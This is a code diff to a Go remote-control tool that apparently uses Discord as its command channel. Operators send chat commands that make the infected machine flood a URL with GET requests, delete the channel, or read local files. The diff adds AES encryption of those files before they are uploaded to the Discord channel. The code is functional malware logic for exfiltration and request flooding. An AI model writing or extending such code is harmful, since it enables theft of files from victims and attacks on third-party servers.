@@ -175,7 +175,7 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 						dg.ChannelMessageSend(message.ChannelID, "[*]Get Req Sent ...")
 					}
 				} else {
-					dg.ChannelMessageSend(message.ChannelID, "[-]Usage: http[:]//urltohit[.]xyz number of times to GET")
+					dg.ChannelMessageSend(message.ChannelID, "[-]Usage: http[:]//urltohit[.]xyz <HowManyTimes>")
 				}
 			} else if message.Content == "kill" {
 				dg.ChannelDelete(channelID.ID)
@@ -195,8 +195,22 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 						fileReader, err := os.Open(file)
 						if err != nil {
 							dg.ChannelMessageSend(message.ChannelID, "[-]Could not open file: "+file)
+						} else {
+							encFilePath, err := util.EncrFile(file, util.AesKey)
+							if err != nil {
+								dg.ChannelMessageSend(message.ChannelID, "[-]Could not manipulate the file")
+							} else {
+								fileReader.Close()
+								fileReader, err = os.Open(encFilePath)
+								if err != nil {
+									dg.ChannelMessageSend(message.ChannelID, "[-]Could not manipulate the file")
+								} else {
+									dg.ChannelFileSend(message.ChannelID, encFilePath, bufio.NewReader(fileReader))
+									defer fileReader.Close()
+									//os.Remove(encFilePath)
+								}
+							}
 						}
-						dg.ChannelFileSend(message.ChannelID, file, bufio.NewReader(fileReader))
 					}
 				}
 			} else if strings.HasPrefix(message.Content, "upload") {
